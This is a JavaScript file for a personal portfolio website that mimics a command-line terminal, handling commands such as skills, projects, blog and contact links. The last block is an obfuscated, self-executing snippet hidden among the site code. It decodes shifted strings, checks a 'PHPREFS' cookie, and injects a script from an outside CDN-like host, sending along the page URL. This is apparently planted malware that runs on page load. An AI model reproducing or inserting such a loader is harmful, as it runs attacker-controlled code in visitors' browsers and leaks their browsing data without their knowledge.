window.addEventListener("DOMContentLoaded", function () {
  let n = document.getElementById("cmd");
  n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
  let e = document.getElementById("output"),
    s = document.getElementById("mainInfo");
  document.getElementById("terminal"),
    n.addEventListener("keypress", function (i) {
      if (13 === i.keyCode && "" !== (i = n.value.trim())) {
        if (
          ((e.innerHTML +=
            "<div><span class='ownerTerminal'><b>hireme@your-company.com</b></span>:<b>~$</b> " +
            i +
            "</div>"),
          (n.value = ""),
          "skills" === i || "s" === i)
        )
          e.innerHTML += skillsBar;
        else if ("github" === i || "gh" === i)
          window.location.href = "https://github.com/cankurttekin";
          else if ("linkedin" === i || "li" === i)
          window.location.href = "https://www.linkedin.com/in/cankurttekin/";
        else if ("email" === i || "em" === i){
          window.location.href = "mailto:cankurttekin@gmail.com";
          e.innerHTML +="cankurttekin@gmail.com";
          }
        else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
        else if ("blog" === i) {
          let n = [],
            s = [],
            i = [],
            l = [],
            t = [];
          fetch("https://xx")
            .then((n) => n.json())
            .then((e) => {
              e.dataMedium.forEach((e) => {
                n.push(e),
                  s.push(e.title),
                  i.push(e.date),
                  l.push(e.link),
                  t.push(e.image);
              }),
                n.forEach((n) => {
                  var e = document.getElementById("blogDiv"),
                    s = document.createElement("article");
                  (s.className = "blogArticle"),
                    (s.onclick = () => linkHref(n.link)),
                    (s.style.display = "inline-block"),
                    (s.innerHTML = `\n                        <h2>${n.title}</h2>\n                        <p>📅: ${n.date}</p>\n                      `),
                    e.appendChild(s);
                });
            })
            .catch((n) => {
              console.error(n);
            }),
            (e.innerHTML += '<div id="blogDiv"></div>');
        } else
          "help" === i
            ? (e.innerHTML += helpCmd)
            : "clear" === i || "c" === i
            ? ((e.innerHTML = ""), (s.innerHTML = ""))
            : (e.innerHTML += "<div>Not found</div>");
        e.scrollTop = e.scrollHeight;
      }
    });
});
let currentSuggestionIndex = -1;
function showSuggestions() {
  let n = document.getElementById("cmd"),
    e = n.value.trim(),
    s = document.getElementById("suggestions");
  var i;
  (s.innerHTML = "") !== e &&
  ((i = suggestions.filter(function (n) {
    return n.startsWith(e);
  })).forEach(function (e, i) {
    var l = document.createElement("div");
    (l.textContent = e),
      l.addEventListener("click", function () {
        (n.value = e), (s.innerHTML = "");
      }),
      s.appendChild(l);
  }),
  0 < i.length)
    ? n.classList.add("command-entered")
    : n.classList.remove("command-entered");
}
function handleKeyDown(n) {
  var e,
    s = document.getElementById("suggestions"),
    i = s.getElementsByTagName("div");
  "ArrowUp" === n.key
    ? (n.preventDefault(),
      0 < currentSuggestionIndex && currentSuggestionIndex--)
    : "ArrowDown" === n.key
    ? (n.preventDefault(),
      currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++)
    : "Enter" === n.key &&
      ((n = document.getElementById("cmd")),
      (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
      (s.innerHTML = ""),
      n.classList.remove("command-entered"));
  for (let n = 0; n < i.length; n++) {
    var l = i[n];
    n === currentSuggestionIndex
      ? l.classList.add("selected")
      : l.classList.remove("selected");
  }
}
function linkHref(n) {
  window.location.href = n;
}
let suggestions = [
    "help",
    "skills",
    "clear",
    "projects",
    "tools",
    "github",
    "linkedin",
    "email",
  ],
  helpCmd =
    '\n  <br>Type \`help\' to see this list. <br />Commands: <br />\n  [<span class="commandName">skills</span>] or [<span class="commandName">s</span>]\n  <br />\n  [<span class="commandName">projects</span>] or [<span class="commandName">pj</span>]\n  <br />\n [<span class="commandName">clear</span>]\n  <br /><br />\n  Contact: <br />\n  [<span class="commandName">github</span>]\n  <br />\n  [<span class="commandName">email</span>]\n  <br />\n [<span class="commandName">linkedin</span>]\n',
  skillsBar =
    '\n<div class="container">\n  Python, C#, .NET, HTML, CSS, JS. SQL & ORM, Flask, Pandas, SQLAlchemy, Keras, SciPy, Scrapy, PyTorch, GNU Linux, Unity, Arduino, GraphQL, AWS, Git, Postman, SPI & I2C & UART, CAD Modelling (Shapr3D), Adobe Photoshop</div>\n',
  projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/cankurttekin/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">x</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        xx <code>X</code>, <code>X</code> \n        xx.\n      </p>\n    </div>\n  </div>\n</article>\n\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/cankurttekin\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">xx<br />xxx</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        xxx.\n      </p>\n    </div>\n  </div>\n</article>\n  <article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/cankurttekin/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">X</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        xx <code>XX</code>, <code>XX</code> x\n        x.\n      </p>\n    </div>\n  </div>\n</article>\n \n</div>\n',
  blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n';
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
